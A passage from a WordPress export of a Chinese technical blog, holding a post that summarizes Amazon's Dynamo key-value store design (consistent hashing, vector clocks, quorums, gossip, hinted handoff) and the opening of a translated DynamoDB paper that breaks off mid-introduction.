		<wp:post_date_gmt><![CDATA[2022-08-27 14:51:00]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-28 22:50:59]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-28 14:50:59]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[timeunion%ef%bc%9a%e9%92%88%e5%af%b9%e6%b7%b7%e5%90%88%e4%ba%91%e5%ad%98%e5%82%a8%e7%9a%84%e6%97%b6%e5%ba%8f%e6%95%b0%e6%8d%ae%e7%ae%a1%e7%90%86%e6%9e%b6%e6%9e%84%e5%92%8c%e7%bb%9f%e4%b8%80%e6%95%b0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b3%bb%e7%bb%9f"><![CDATA[数据库系统]]></category>
		<category domain="post_tag" nicename="%e6%97%b6%e5%ba%8f%e6%95%b0%e6%8d%ae"><![CDATA[时序数据]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_3c63dec981c7d9a80387dcb41ac091d8]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53958ae40]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81023e1d1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81163e1d2]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[451]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[Dynamo: Amazon’s Highly Available Key-value Store]]></title>
		<link>http://www.ironmanzzm.top/?p=466</link>
		<pubDate>Sun, 28 Aug 2022 14:49:01 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=466</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:shortcode -->
[toc]
<!-- /wp:shortcode -->

<!-- wp:heading -->
<h2>Dynamo回顾</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dynamo是2006年Amazon为了支撑内部应用而设计的键值数据库，主要为了满足以下需求而构建：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>在购物车、客户偏好、商品目录等应用场景下往往只需要以主键（Primary Key）去检索一个对应的值（Value），关系型数据库在这些场景下效率会非常低下。</li><li>而面对日益增长的用户数量，系统应该具有良好的<strong>扩展性</strong>，通过增加设备的数量提供更强大的服务能力。</li><li>保证一部分设备下线或数据中心断电后仍能向客户提供稳定服务，需要系统保证数据的<strong>可用性</strong>和<strong>一致性</strong>。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3>数据分区（Partitioning）</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dynamo提供增量扩展的能力，系统中随时可能有新节点加入。Dynamo采用<strong>一致性哈希</strong>将数据分散到各个节点，并使新加入的节点可以用简单的方式加入到集群中。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>原始一致性哈希</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>逻辑上将所有节点排列成一个环，每个节点经过哈希后被分配到一个位置，就像时钟上的刻度。当一个新的数据写入时，计算key的哈希值，并对应到环中的位置<code>p</code>。从<code>p</code>出发顺时针找到的第一个节点，将数据存到该节点中。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Dynamo最早采用原始的算法进行分区管理，但逐渐发现原始算法有两个问题：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>节点位置通过哈希值分配，导致每个节点之间的间隔可能不一样，数据点落在每个间隔的概率也不一样。</li><li>网络中的节点可能是性能不同的服务器，没有办法针对不同性能的节点分配负载。 因此需要对算法进行改进。</li></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4>改进的一致性哈希</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>与原始版本环上是物理节点不同，改进版本的环与物理节点解耦，由虚拟节点组成。一个物理节点可以对应到多个虚拟节点，每个虚拟节点对应一个环上的<code>token</code>。当一个新节点<code>X</code>加入到系统后，获得特定数量的<code>token</code>，数量可以根据物理节点的容量调节。通过对应到不同数量的虚拟节点，获得了弹性的节点管理能力。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220824215327.png" alt="三种哈希方法示意图"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>数据复制（Replication）</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了在部分服务器宕机的情况下不丢失数据并继续为客户提供服务，Dynamo在数据分区的基础上将同一份数据拷贝到<code>N</code>个节点上。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>具体来说，插入一个数据时找到环上的第一个节点后，这个节点成为协调者节点<code>（coordinator）</code>。协调者节点负责将数据复制到环上顺时针顺序的后续<code>N-1</code>个节点上。如下图所示，主键为K的数据被哈希到区间<code>(A, B]</code>，节点B成为协调者节点后将数据拷贝到节点C和节点D.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>存储<code>Key K</code>的所有逻辑节点会被加入到一个列表中，称为<strong>Preference List</strong>，在选择逻辑节点时如果遇到重复的物理节点就会跳过该节点，以保证列表中的N个物理节点是不重复的。为了提升高可用性，Preference List中的节点要分散到不同的数据中心，以防止某个数据中心挂掉。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220825113450.png" alt=""/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>增加/移除节点</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>当一个新节点要加入到环中，后续的几个节点原来负责管理的一部分范围会移交到新节点。例如上图中如果加入一个新节点<code>X</code>到<code>(A,B]</code>，原本由节点<code>B</code>负责的<code>(F, G]</code>分区会被移交到<code>X</code>，<code>B</code>向<code>X</code>传输相应范围内的数据。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果<code>X</code>被移除，则会将对应的数据分散到对应其它节点。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>实际运行表明这种方式可以在存储节点之间保持key的均匀分布。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>最终一致性</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dynamo提供<strong>最终一致性</strong>保证，更新操作异步地持久化到系统中，也就是说协调者向副本节点发送完副本不会等所有副本节点都回复，就会向客户端返回成功消息。网络中的数据最终会达到一致，但什么时候能达到一致是不清楚的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>更新数据时协调者节点会将新数据拷贝给Perference List中的各个副本节点，新数据经过分区和拷贝，分散到各个数据中心的不同节点上。但难免会有某个节点暂时掉线或由于并发写入而使得各个副本出现不一致的状况。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Dynamo通过<strong>向量时钟</strong>和<strong>读时合并</strong>对数据的多个版本进行管理。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>向量时钟（Vector Clock）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Lamport时间戳可以表示具有因果关系的事件之间的逻辑顺序，但是对于相互之间没有因果关系的事件，Lamport时间戳并不能正确地表示。形式化地表述的话，假设有事件<code>a</code>和事件<code>b</code>，<code>C(x)</code>表示事件<code>x</code>的逻辑时间戳，若事件<code>a</code>发生在<code>b</code>之前<code>（a-&gt;b）</code>，则可以推出<code>C(a)&lt;C(b)</code>；但在<code>C(a)&lt;C(b)</code>的情况下，其实有可能是<code>a</code>和<code>b</code>并发地另一个进程发送消息，两者之间并不能推断出存在因果关系。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果使用Lamport时间戳管理不同的数据版本，可能会出现一份数据并发地被两个节点修改，两个版本属于需要进行合并操作，但是由于时间戳存在大小关系导致系统将其中一份数据当作旧版本覆盖掉。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>向量时钟是对Lamport时间戳的改进，通过<strong>版本向量</strong>记录当前版本数据先前被哪些节点修改过，每个节点修改过几次。只要对比版本向量，就可以判断出两个版本存在先后顺序还是平行的版本。如果版本向量<code>a</code>中的所有计数器都小于另一个版本向量<code>b</code>，那么就可以判断<code>a</code>是<code>b</code>的祖先版本，可以被安全地覆盖。否则两个版本存在冲突。（为了控制篇幅向量时钟具体怎么操作的请参考原论文和<a href="https://zhuanlan.zhihu.com/p/56886156">分布式系统：向量时钟</a>）</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://img.ironmanzzm.top/blog-img/20220825191018.png" alt="向量时钟示意图"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>读时合并</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>客户端进行写入时需要先进行读取，从数据的context可以知道该数据目前有多少个版本。如上图存在<code>D3</code>和<code>D4</code>两个冲突版本。某个客户端读取时会读取所有版本并在本地进行合并后，由<code>Sx</code>作为协调节点进行写回。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>为了缩短版本向量的长度，Dynamo为每一个<code>(节点, 计数器)</code>元组附加记录上一次计数器加一的时间戳，当版本向量长度到达一定阈值时，将最老的元组剔除。这种做法可能可能会导致版本冲突判断出现误差，但作者表示运行当中并没有发现太大问题。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>宽松仲裁（Sloppy Quorum）</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了保证写入和读取内容的一致性，Dynamo采用类似仲裁系统<code>（Quorum Systems）</code>的一致性协议，简单来说就是读写申请需要得到半数以上的节点同意才能进行。假设一个数据需要复制到<code>N</code>个副本节点，<code>R</code>和<code>W</code>分别代表读和写的票数，则需要满足不等式<code>R+W&gt;N</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>具体的读写过程如下：</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Put()</code>：协调者节点将数据写入本地并更新版本向量后，将版本向量连同数据发送到<code>N</code>个副本节点，如果至少有<code>W-1</code>个副本节点返回成功，则本次写入视作成功。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>Get()</code>：协调者节点收到请求后将该请求发送给<code>N</code>个副本节点，等待<code>R</code>个结果返回后，检查版本向量。如果存在多个不具有因果关系的版本，则将它们全部发送给客户端，由客户端进行冲突合并。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Merkle Tree</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了能快速检测出不同节点中副本是否达到了一致，每个节点都为哈希环上的边所对应的键范围建立了Merkle Tree.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Merkle Tree以实际存储的数据为叶结点，相邻的两个叶结点分别计算哈希值，组成一个非叶结点作为它们的共同父结点。得到的所有父节点重复该步骤，逐层向上构造，直到得到一个根节点。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>如果两个节点的副本数据一致，根结点的哈希值也会相同；若不相同，以树搜索的方式向下找到不一致的叶子节点并解决冲突。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>通过树状索引的方式可以避免线状扫描和传输范围内所有数据带来的开销，但当有节点加入或脱离，key range发生改变，就需要重新计算哈希值构建树。Merkle Tree同样运用在在比特币的区块链系统中。[7]</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>高可用保证</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了保证能提供随时可用的服务，除了将数据分散到不同数据中心的服务器，在节点下线后也要能及时检测出并找到可以替代它的节点。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Gossip协议</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dynamo中采用去中心化的故障检测方法Gossip协议。这个协议受传染病模型的启发，一些节点被指定为种子节点（病原体），向其他节点发送消息。接收到消息的节点被传染后，随机向其他节点发送消息，直到所有节点都进行过信息交换。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>只要客户端保持一定频率的请求，各个节点之间就会产生交互，而只要某个节点在一段时间内没有相应，请求方就可以认为该节点已经下线（实际上有可能并没有下线，只是由于两个节点间的网络问题），并从Preference List找到其它节点处理请求。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在网络中的节点都是可信节点的环境中，Gossip协议是一个非常好用的去中心化分布式协议。可扩展性高，具有容错能力，提供最终一致性。不足之处在于传播过程有启动过程，因此存在延迟；而各个节点随机传播信息，网络中存在冗余信息，浪费了一部分网络带宽和CPU资源。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/y16mvh0f28.gif" alt="Gossip协议示意图"><br>（图转自[4]）</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4>Hinted Handoff</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>为了保证数据持久性和写入高可用，当协调者节点挂掉时，请求会被发送到其它可用的节点。接收到请求的节点会在额外的数据库中保存该数据，记录原来的协调者是哪个节点，并定期检查协调者是否重新上线。一旦原来的协调者重新上线，便将数据传输回去并删掉本地的数据副本。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>挂掉的节点负责的数据临时交给另一个节点，等挂掉节点重新上线后再交换给它，可以让系统读写能力不受短时故障影响。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>总结</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Dynamo可用于对可用性、可扩展性和稳定性要求较高的场景。设计中采用的一系列技术到今天大家都多少有所耳闻。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>1、并不是所有应用都需要SQL的复杂性和事务保证</strong><br>Dynamo作为早期NoSQL数据库中的佼佼者，对企业数据库架构设计产生了深远的影响。携程最近发的一篇博客也提到内部开发了一套Dynamo风格的存储系统[5]。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Amazon设计Dynamo的动机可以追溯到一次流量高峰期间，由于数据库事务死锁导致的严重故障。经过深刻的反思后，他们发现浏览商品和添加购物车之类的负载根本不需要用到复杂的事务性保证。系统只要保证在高并发情况下可用，提供稳定的性能保证就够了。由此拉开了分布式NoSQL系统的大幕。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Dynamo的成功应用也证明，只提供最终一致性完全可以用于构建高可用系统。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>2、去中心化的架构可以带来灵活的控制能力。</strong><br>Dynamo的去中心化可以体现在读写的去中心化和集群管理的去中心化。</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>中心化的系统写入往往通过master节点调度，虽然保证一致性，但在要求性能的场景下容易成为瓶颈。一致性和可用性可以通过调整参数进行调节，例如仲裁系统中提供的三个参数<code>R</code>, <code>W</code>和<code>N</code>，通过减少<code>W</code>可以通过牺牲一致性使系统在更多节点挂掉后仍具有随时可写入的能力。</li><li>集群通过Gossip协议可以自动发现节点加入和故障，不需要引入外部服务，降低了系统的复杂性。</li></ul>
<!-- /wp:list -->

<!-- wp:heading -->
<h2>参考文献</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>[1] Dynamo: Amazon’s Highly Available Key-value Store<a href="https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf">[pdf]</a><a href="https://arthurchiao.art/blog/amazon-dynamo-zh/">[中文翻译]</a><br>[2] <a href="https://news.ycombinator.com/item?id=915212">Dynamo: A flawed architecture</a><br>[3] <a href="https://zhuanlan.zhihu.com/p/31147149/">一篇改变互联网发展进程的论文 | Dynamo</a><br>[4] <a href="https://cloud.tencent.com/developer/inventory/2929/article/1662426">一致性算法-Gossip协议详解</a><br>[5] <a href="https://zhuanlan.zhihu.com/p/556601917">携程Dynamo风格存储的落地实践</a><br>[6] <a href="https://www.prnasia.com/story/351088-1.shtml">NoSQL“开山之作”Amazon DynamoDB的十年创新之旅</a><br>[7] <a href="https://zhuanlan.zhihu.com/p/103372259">Merkle Tree</a><br>[8] <a href="https://zhuanlan.zhihu.com/p/419944615">向量时钟（Vector Clock）的本质</a></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[本文对Dynamo的设计和实现涉及的技术进行了总结。Dynamo是一个高可用、可扩展和提供最终一致性的KV存储系统。为了实现高可用要求，Dynamo牺牲了某些故障场景下的一致性。Dynamo的经典设计使它被誉为NoSQL数据库的“开山之作”。其设计理念至今仍然值得细细体会。]]></excerpt:encoded>
		<wp:post_id>466</wp:post_id>
		<wp:post_date><![CDATA[2022-08-28 22:49:01]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-08-28 14:49:01]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-08-28 23:39:43]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-08-28 15:39:43]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[dynamo-amazons-highly-available-key-value-store]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f"><![CDATA[分布式系统]]></category>
		<category domain="post_tag" nicename="%e5%88%86%e5%b8%83%e5%bc%8f%e7%b3%bb%e7%bb%9f"><![CDATA[分布式系统]]></category>
		<category domain="post_tag" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93"><![CDATA[数据库]]></category>
		<category domain="category" nicename="%e6%95%b0%e6%8d%ae%e5%ba%93%e7%b3%bb%e7%bb%9f"><![CDATA[数据库系统]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e7%a7%91%e5%ad%a6"><![CDATA[计算机科学]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[467]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53958ae40]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81023e1d1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81163e1d2]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[[译文] Amazon DynamoDB: A Scalable, Predicably Performant, and Fully Managed NoSQL Database Service]]></title>
		<link>http://www.ironmanzzm.top/?p=473</link>
		<pubDate>Thu, 01 Sep 2022 02:06:09 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">https://www.ironmanzzm.top/?p=473</guid>
		<description></description>
		<content:encoded><![CDATA[<!-- wp:heading {"level":1} -->
<h1 id="%E6%91%98%E8%A6%81">摘要</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Amazon DynamoDB是一个NoSQL云数据库服务，可以在任意规模上提供稳定的性能。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>成千上万的客户依赖于DynamoDB的基本特性:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>一致的性能</li><li>可用性</li><li>持久性</li><li>完全托管的Serverless服务</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>在2021年66小时的亚马逊黄金日购物活动期间，亚马逊的内部系统对DynamoDB进行了数万亿次API调用，峰值为每秒8920万次请求，仍能体验到几毫秒级别的性能和高可用性。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>自2012年推出DynamoDB以来，我们根据操作经验对其设计和实现进行了改进。在不影响可用性和性能的情况下，成功地解决了<strong>公平性</strong>、<strong>跨分区</strong>的<strong>流量不平衡</strong>、<strong>监控</strong>和<strong>自动化系统操作</strong>方面的问题。<strong>可靠性是至关重要的</strong>，因为即使是最轻微的中断也会对客户造成重大影响。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>本文介绍了我们在大规模环境下运行DynamoDB的经验，以及该架构如何不断发展以满足客户不断增长的工作负载需求。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":1} -->
<h1 id="1-%E5%BC%95%E8%A8%80">1 引言</h1>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Amazon DynamoDB是一个NoSQL云数据库服务，支持任意规模的<strong>快速</strong>和<strong>可预测性能</strong>。DynamoDB是一个基础的AWS服务，使用位于世界各地数据中心的大量服务器为数十万客户提供服务。DynamoDB为多个高流量的亚马逊工具和系统赋能，包括Alexa，亚马逊网站和所有亚马逊配送中心。此外，许多AWS服务，如AWS Lambda、AWS Lake Formation和Amazon SageMaker，以及成千上万的客户应用程序都是建立在DynamoDB上的。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><img src="https://img.ironmanzzm.top/blog-img/20220829210508.png" alt="图1：DynamoDB发展历程"><br>（原文这里timeline打成了yimeline，已经发了封邮件告诉他们lol.）</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>这些应用程序和服务在性能、可靠性、持久性、效率和规模方面有很高的操作要求。DynamoDB的用户依赖于它稳定的低延迟请求响应能力。<strong>对于DynamoDB客户来说，在任意规模上保持稳定的性能往往比追求更低的请求响应时延中位数更重要</strong>，因为无法预测的高延迟请求可能会在高层应用中放大，从而导致糟糕的客户体验。<strong>DynamoDB设计的目标是用几毫秒的较低延迟完成所有请求。</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>此外，大量使用DynamoDB的客户依赖于一个不断扩展的特性集合，如图1所示。在DynamoDB过去十年的发展中，<strong>一个关键的挑战是在不影响运作的情况下添加特性</strong>。为了使客户和应用程序开发人员受益，DynamoDB独树一帜地集成了以下<strong>六个基本系统特性</strong>:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB是一个完全托管的云服务。</strong>&nbsp;使用DynamoDB API，应用程序可以创建表并读写数据，而不需要考虑这些表存储在哪里或如何管理它们。DynamoDB使开发人员从软件升级、硬件管理、配置分布式数据库集群和集群运维工作中解脱出来。DynamoDB可以处理资源分配、自动故障恢复、数据加密、软件升级、执行备份，并完成全托管服务所需的其他任务。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB采用多租户体系结构。</strong>&nbsp;DynamoDB将来自不同客户的数据存储在相同的物理机器上，以确保资源的高利用率，使我们能够为客户提供更经济的服务。资源预留、严格分配和用量监控为驻留在同一处的表提供隔离。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB实现了表的无限规模。</strong>&nbsp;每个表可以存储的数据量没有预设限制。表格弹性增长，以满足客户的应用需求。DynamoDB的设计允许将按需分配一个表的资源从几个服务器扩展到数千个。随着数据存储量和吞吐量需求的增长，DynamoDB将应用程序的数据分散到更多的服务器上。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB提供可预测的性能。</strong>&nbsp;简单的<code>GetItem</code>和<code>PutItem</code>操作DynamoDB API使它能以稳定的低延迟响应请求。在同一个AWS Region运行的应用程序，对于一个1KB的item来说，平均服务端延迟在几毫秒范围内。最重要的是，DynamoDB延迟是可预测的。即使表从几兆字节增长到几百兆字节，由于DynamoDB中的数据存储和请求路由算法具有分布式特性，延迟仍然可以保持稳定。DynamoDB通过水平扩展、自动分区和重新分区数据来处理任何级别的流量，以满足应用程序的I/O性能需求。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>DynamoDB是高度可用的。</strong>&nbsp;DynamoDB跨多个数据中心(在aws中称为可用域)复制数据，并在磁盘或节点故障时自动重新复制，以满足严格的可用性和持久性要求。客户还可以创建跨区域（Region）进行地理复制的全局表，以进行灾难恢复，并从任何地方提供低延迟访问。DynamoDB为普通表和全局表提供了99.99的可用性SLA(其中DynamoDB跨多个AWS region进行跨表复制)。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
